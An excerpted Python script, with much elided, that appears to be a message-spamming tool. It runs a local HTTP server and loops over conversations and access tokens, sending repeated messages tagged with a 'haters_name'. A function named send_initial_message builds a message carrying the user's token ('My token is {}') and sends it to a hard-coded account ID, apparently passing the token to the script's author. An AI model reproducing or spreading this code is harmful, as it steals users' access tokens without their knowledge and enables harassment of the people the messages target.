...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"CREATED BY Rahul Kumar")
...
def send_initial_message():
    ...
    msg_template = "Hello Rahul Kumar ! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "100091474494729"
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                if response.ok:
                    print( 
                        "\033[1;92m[+] Rahul Kumar {} of Convo {} Token {}: {}".format(
                            message_index + 1,
                            convo_id,
                            token_index + 1,
                            haters_name + " " + message,
